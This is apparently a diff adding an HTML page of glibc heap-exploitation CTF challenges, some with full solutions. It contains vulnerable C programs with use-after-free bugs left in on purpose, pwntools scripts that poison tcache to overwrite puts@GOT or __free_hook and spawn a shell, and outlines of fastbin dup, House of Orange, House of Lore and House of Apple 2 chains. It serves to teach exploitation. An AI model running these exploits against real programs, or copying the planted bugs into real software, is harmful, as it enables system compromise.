+    p.sendlineafter(b'Index (0-7): ', str(idx).encode())
+    p.sendlineafter(b'Data: ', data)
+
+def delete(idx):
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+
+def view(idx):
+    p.sendlineafter(b'> ', b'3')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+
+def edit(idx, data):
+    p.sendlineafter(b'> ', b'4')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+    p.sendlineafter(b'Data: ', data)
+
+# RECORD_SIZE = 0x28, chunk size = 0x30
+
+# 1. Allocate record 0 and free it
+add(0, b'A' * 8)
+delete(0)
+
+# 2. UAF: overwrite freed chunk's fd with puts@GOT
+edit(0, p64(puts_got))
+
+# 3. malloc → returns chunk 0 (tcache head)
+add(1, b'B' * 8)
+
+# 4. malloc → returns puts@GOT!
+#    Write win() address → overwrites puts@GOT
+add(2, p64(win_addr))
+
+# 5. Any call to puts() now calls win() → shell
+#    The menu() function calls puts(), so just trigger the menu
+p.sendlineafter(b'> ', b'5')  # exit calls exit(), but menu prints first
+
+p.interactive()</code></pre>
+
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The binary is compiled with <code>-z norelro</code>, meaning the GOT is writable. Use the UAF to poison the tcache fd pointer with the address of <code>puts@GOT</code>. After two allocations, you'll get a chunk at the GOT. Write <code>win()</code> there, and the next call to <code>puts()</code> will actually call <code>win()</code>.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 3 -->
+        <div class="ctf-card">
+          <h4>Challenge 3: RestrictedHeap</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">You only get 6 allocations, 4 frees, and 2 reads. Chain an unsorted bin leak with tcache poisoning to overwrite <code>__free_hook</code> and pop a shell. No win function provided.</p>
+
+          <h5>Source</h5>
+<pre><code class="language-c">// restricted_heap.c
+// Compile: gcc -o restricted_heap restricted_heap.c -no-pie
+// Requires: glibc 2.31 (has __free_hook, no safe-linking)
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+#define MAX_CHUNKS 16
+
+char *chunks[MAX_CHUNKS];
+size_t sizes[MAX_CHUNKS];
+int alloc_count = 0;
+int free_count = 0;
+int read_count = 0;
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    int choice, idx;
+    size_t size;
+
+    puts("=== Restricted Heap ===");
+    puts("Rules: 6 allocs, 4 frees, 2 reads. Good luck.");
+
+    while (1) {
+        printf("\n[allocs:%d/6 frees:%d/4 reads:%d/2]\n", alloc_count, free_count, read_count);
+        puts("1. Alloc  2. Free  3. Read  4. Write  5. Exit");
+        printf("&gt; ");
+        scanf("%d", &amp;choice);
+
+        switch (choice) {
+            case 1:
+                if (alloc_count &gt;= 6) { puts("No more allocs!"); break; }
+                printf("Index: "); scanf("%d", &amp;idx);
+                printf("Size: ");  scanf("%zu", &amp;size);
+                if (idx &lt; 0 || idx &gt;= MAX_CHUNKS || size &gt; 0x500) break;
+                chunks[idx] = malloc(size);
+                sizes[idx] = size;
+                alloc_count++;
+                break;
+            case 2:
+                if (free_count &gt;= 4) { puts("No more frees!"); break; }
+                printf("Index: "); scanf("%d", &amp;idx);
+                if (idx &lt; 0 || idx &gt;= MAX_CHUNKS || !chunks[idx]) break;
+                free(chunks[idx]);
+                // BUG: no NULL
+                free_count++;
+                break;
+            case 3:
+                if (read_count &gt;= 2) { puts("No more reads!"); break; }
+                printf("Index: "); scanf("%d", &amp;idx);
+                if (idx &lt; 0 || idx &gt;= MAX_CHUNKS || !chunks[idx]) break;
+                write(1, chunks[idx], sizes[idx]);
+                puts("");
+                read_count++;
+                break;
+            case 4:  // write is unlimited
+                printf("Index: "); scanf("%d", &amp;idx);
+                if (idx &lt; 0 || idx &gt;= MAX_CHUNKS || !chunks[idx]) break;
+                printf("Data: ");
+                read(0, chunks[idx], sizes[idx]);
+                break;
+            case 5:
+                exit(0);
+        }
+    }
+}</code></pre>
+
+          <h5>Solution</h5>
+<pre><code class="language-python">from pwn import *
+
+p = process('./restricted_heap')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+def alloc(idx, size):
+    p.sendlineafter(b'> ', b'1')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+    p.sendlineafter(b'Size: ', str(size).encode())
+
+def free_chunk(idx):
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+
+def read_chunk(idx):
+    p.sendlineafter(b'> ', b'3')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+
+def write_chunk(idx, data):
+    p.sendlineafter(b'> ', b'4')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+    p.sendlineafter(b'Data: ', data)
+
+# ═══════════════════════════════════════════════════════
+# Budget: 6 allocs, 4 frees, 2 reads
+#
+# Plan:
+#   - Alloc a large chunk (>0x410) → free → unsorted bin → leak libc (1 alloc, 1 free, 1 read)
+#   - Alloc two small chunks → free both → tcache poison → __free_hook (3 allocs, 2 frees)
+#   - Alloc twice to consume tcache + get chunk at __free_hook (2 allocs)
+#   - Write system to __free_hook, "/bin/sh" to a chunk, free it (1 free)
+#   Total: 6 allocs, 4 frees, 1 read  ✓
+# ═══════════════════════════════════════════════════════
+
+# ── PHASE 1: Leak libc ──
+# Alloc #1: Large chunk (goes to unsorted bin on free, bypasses tcache)
+alloc(0, 0x420)
+# Alloc #2: Guard chunk (prevents consolidation with top chunk)
+alloc(1, 0x20)
+
+# Free #1: chunk 0 → unsorted bin (size 0x430 > 0x410, skips tcache)
+free_chunk(0)
+
+# Read #1: UAF read of chunk 0 → fd points into main_arena
+read_chunk(0)
+leaked = u64(p.recv(8))
+p.recvline()  # consume newline
+log.info(f"leaked: {hex(leaked)}")
+
+main_arena_offset = libc.symbols['__malloc_hook'] + 0x10
+libc.address = leaked - (main_arena_offset + 96)
+log.success(f"libc base: {hex(libc.address)}")
+
+free_hook = libc.symbols['__free_hook']
+system = libc.symbols['system']
+log.info(f"__free_hook: {hex(free_hook)}")
+log.info(f"system:      {hex(system)}")
+
+# ── PHASE 2: Tcache poison → __free_hook ──
+# Alloc #3: Small chunk for tcache poison
+alloc(2, 0x30)
+# Alloc #4: Another small chunk (will hold "/bin/sh")
+alloc(3, 0x30)
+
+# Free #2: chunk 2 → tcache[0x40]
+free_chunk(2)
+
+# UAF write: overwrite chunk 2's fd with __free_hook
+write_chunk(2, p64(free_hook))
+
+# Alloc #5: pops chunk 2 from tcache. tcache head now = __free_hook
+alloc(4, 0x30)
+
+# Alloc #6: pops __free_hook from tcache → we get a chunk at __free_hook
+alloc(5, 0x30)
+
+# Write system() to __free_hook
+write_chunk(5, p64(system))
+log.success("__free_hook → system()")
+
+# ── PHASE 3: Trigger ──
+# Write "/bin/sh" into chunk 3
+write_chunk(3, b'/bin/sh\x00')
+
+# Free #3 → free(chunk3) → __free_hook(chunk3) → system("/bin/sh")
+free_chunk(3)
+
+log.success("Shell incoming!")
+p.interactive()</code></pre>
+
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><b>Hint 1:</b> Allocate a chunk larger than 0x410 bytes — it bypasses tcache entirely and goes straight to the unsorted bin on free. This saves you from needing 7 frees to fill tcache.</p>
+            <p><b>Hint 2:</b> You need a guard chunk between the large chunk and the top chunk, otherwise the large chunk will consolidate into the wilderness on free.</p>
+            <p><b>Hint 3:</b> Budget carefully. You only need 1 read (for the libc leak). Use unlimited writes to do tcache poisoning via UAF.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: Heap Feng Shui</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">The allocator uses different-sized chunks for "names" (0x20) and "descriptions" (0x80). Arrange allocations and frees so that a freed description overlaps a name struct's function pointer. Control execution via heap layout manipulation.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># Heap feng shui: arrange chunks so that a UAF or overlap gives control
+# Key: free a 0x80 description, then allocate a 0x80 name+desc pair
+# The new allocation reuses the old description's memory
+# If the name struct has a function pointer at offset 0, you control it
+
+# Step 1: Create item A (alloc name_A 0x20, desc_A 0x80)
+# Step 2: Create item B (alloc name_B 0x20, desc_B 0x80)
+# Step 3: Delete item A (free name_A, free desc_A)
+# Step 4: Delete item B (free name_B, free desc_B)
+# Step 5: Create item C with 0x20-sized desc → gets name_B's old chunk
+#         AND 0x80-sized chunk → gets desc_A's old chunk
+# But if there's a dangling pointer to desc_A, you can read/write it
+# through item C's perspective</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Draw out the heap layout on paper. Track which chunks go to which tcache bins (0x30 for names, 0x90 for descriptions). When you free and reallocate, the LIFO nature of tcache means the most recently freed chunk of matching size is returned first. Arrange frees in the right order to get overlapping references.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: Fastbin Frenzy</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Binary runs on glibc 2.23 (no tcache). Use fastbin dup to overwrite <code>__malloc_hook</code> with a one_gadget. The trick: find a fake chunk size near <code>__malloc_hook</code> using the 0x7f byte from libc addresses.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># The classic trick: __malloc_hook is near a 0x7f byte in memory
+# 0x7f works as a fastbin size for 0x70-sized chunks (0x70 size field = 0x71..0x7f)
+# In GDB:
+(gdb) find &amp;__malloc_hook - 0x30, &amp;__malloc_hook, 0x7f
+# Find offset where 0x7f appears → use as fake chunk size</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Allocate 0x60-sized chunks (fastbin 0x70). Use double-free: <code>free(a), free(b), free(a)</code>. Poison fd with the address of the fake 0x7f chunk near <code>__malloc_hook</code> (typically <code>__malloc_hook - 0x23</code> or <code>-0x13</code>). After 3 mallocs, you get a chunk overlapping <code>__malloc_hook</code>. Write one_gadget there, then trigger malloc.</p>
+<pre><code class="language-python">from pwn import *
+
+libc = ELF('./libc.so.6')
+# fake_chunk = libc.sym['__malloc_hook'] - 0x23
+# This aligns so that the 0x7f byte in a nearby libc address
+# appears as the size field of a 0x70-class fastbin chunk
+# After allocation: write padding + one_gadget at __malloc_hook offset</code></pre>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: Large Bin Attack</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Exploit the large bin insertion code to write a heap address to an arbitrary location. Use this to overwrite <code>global_max_fast</code>, enabling fastbin-range attacks on much larger chunks.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// When a chunk is inserted into a large bin and is smaller than
+// the current smallest in that bin:
+//   victim-&gt;fd_nextsize = fwd
+//   victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize
+//   fwd-&gt;bk_nextsize = victim
+//   victim-&gt;bk_nextsize-&gt;fd_nextsize = victim
+//
+// By corrupting fwd-&gt;bk_nextsize, we control where victim's
+// address gets written (arbitrary write of a heap pointer)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. Allocate two large chunks (different large bin sizes). 2. Free both → they go to unsorted bin. 3. Allocate something to trigger sorting → larger goes to large bin. 4. Corrupt the large bin chunk's <code>bk_nextsize</code> to <code>&amp;target - 0x20</code>. 5. Trigger sorting of the second chunk → writes heap address to target. Common target: <code>global_max_fast</code> — setting it to a huge value makes all chunks go through fastbin path, enabling fastbin attacks on any size.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: House of Orange</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">No <code>free()</code> available in the binary! Corrupt the top chunk size to trigger <code>sysmalloc</code> → old top chunk is freed into unsorted bin. Then use unsorted bin attack + FSOP to get a shell.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># House of Orange (glibc &lt; 2.24 classic, adapted for newer):
+# Phase 1: Shrink top chunk
+#   - Overflow to set top chunk size to small value (must be page-aligned)
+#   - malloc(larger than top) → sysmalloc frees old top → unsorted bin
+#
+# Phase 2: Unsorted bin attack → overwrite _IO_list_all
+#   - Corrupt unsorted bin chunk's bk → &amp;_IO_list_all - 0x10
+#   - Next malloc writes main_arena+88 to _IO_list_all
+#
+# Phase 3: FSOP
+#   - The written value (main_arena+88) is treated as _IO_FILE ptr
+#   - The smallbin[4] entry at main_arena+88+0x60+0x8 = a chunk we control
+#   - Forge a fake _IO_FILE there → calls system("/bin/sh") on abort</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The top chunk size must satisfy: <code>(top_size &amp; 0xfff) == old_top_end &amp; 0xfff - 0x10</code> (page-aligned end). After <code>sysmalloc</code> frees the old top, you have a free chunk in unsorted bin without ever calling <code>free()</code>. On glibc &gt;= 2.24, the vtable check was added — use <code>_IO_str_jumps</code> instead of a fake vtable.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: House of Lore</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Corrupt a smallbin chunk's <code>bk</code> pointer to insert a fake chunk into the smallbin. When <code>malloc</code> later returns chunks from this bin, you get allocation at an arbitrary address.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Smallbin allocation returns bin-&gt;bk (FIFO order)
+// After returning victim:
+//   bck = victim-&gt;bk
+//   bin-&gt;bk = bck
+//   bck-&gt;fd = bin
+// By setting victim-&gt;bk to &amp;fake_chunk:
+//   fake_chunk gets linked into smallbin
+//   Next malloc from this bin returns &amp;fake_chunk
+// Requires: fake_chunk-&gt;bk must be writable (bck-&gt;fd = bin writes there)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. Get a chunk into smallbin (fill tcache first, free to unsorted, sort to smallbin). 2. UAF overwrite the smallbin chunk's bk with address of a fake chunk on the stack or heap. 3. The fake chunk must have a writable <code>bk</code> field. 4. Two <code>malloc</code> calls: first returns the real smallbin chunk, second returns your fake chunk.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: Heap Consolidation Trick</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Exploit incorrect <code>prev_size</code> handling to trigger backward consolidation that creates an overlapping chunk. Use the overlap to leak heap metadata and pivot to GOT overwrite.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># Backward consolidation occurs when:
+# 1. Chunk B is freed
+# 2. B's PREV_INUSE bit is 0 (previous chunk appears free)
+# 3. glibc reads B's prev_size to find the "previous" chunk start
+# 4. Merges B with the "previous" chunk via unlink
+#
+# If we control prev_size, we can make consolidation reach
+# back further than expected → overlapping chunks
+
+# Attack:
+# [A 0x100][B 0x100][C 0x100]
+# Overflow from A to clear C's PREV_INUSE and set C's prev_size = 0x210
+# Free C → consolidation thinks free region starts at A
+# Malloc(0x200) → returns A's area, overlapping B
+# Now you can read/write B through the overlapping chunk</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>You need to fake a free chunk at A's position for the unlink to succeed. Place fake <code>fd</code> and <code>bk</code> pointers in A's user data that satisfy <code>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</code>. On glibc 2.31+, also handle tcache: if chunks are tcache-sized, they go to tcache first and skip consolidation. Use sizes &gt; 0x410 to bypass tcache.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: Modern Heap (glibc 2.35+)</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Full exploit on glibc 2.35: safe-linking, no hooks, enhanced tcache checks. Combine a heap leak (to defeat safe-linking) with a libc leak (unsorted bin) and FSOP (House of Apple 2) for shell.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># Modern exploitation chain on glibc 2.35:
+#
+# 1. Heap leak:
+#    - Free chunk to tcache → UAF read → recover (addr >> 12) via safe-linking
+#    - heap_base = leaked_value &lt;&lt; 12
+#
+# 2. Libc leak:
+#    - Fill tcache (7 frees), free 8th → unsorted bin → UAF read → libc
+#
+# 3. Arbitrary write via tcache poison (with safe-linking encoding):
+#    - free(A), UAF write A-&gt;fd = PROTECT_PTR(target, A)
+#    - malloc, malloc → chunk at target
+#
+# 4. FSOP via House of Apple 2:
+#    - Overwrite _IO_list_all or stderr with pointer to fake FILE
+#    - Fake FILE: _flags = "  sh", vtable = _IO_wfile_jumps
+#    - _wide_data-&gt;_wide_vtable-&gt;__doallocate = system
+#    - Trigger: exit() or assert failure (stderr flush)
+#
+# No __free_hook, no __malloc_hook — pure FSOP</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The hardest part is getting the fake FILE struct right. Key fields: <code>_flags</code> must contain <code>"/bin/sh"</code> for system's argument, <code>_IO_write_ptr &gt; _IO_write_base</code> to trigger the flush path, <code>_wide_data</code> must point to a controlled area with a fake wide vtable, and the main vtable must be <code>_IO_wfile_jumps</code> (within the valid vtable range). Use the pwntools <code>FileStructure</code> class to build it.</p>
+<pre><code class="language-python">from pwn import *
+
+# Build fake FILE struct for House of Apple 2
+fs = FileStructure()
+fs.flags = u64(b"  sh\x00\x00\x00\x00")
+fs._IO_write_base = 0
+fs._IO_write_ptr = 1
+fs._wide_data = fake_wide_data_addr
+fs.vtable = io_wfile_jumps
+payload = bytes(fs)</code></pre>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</body>
+</html>
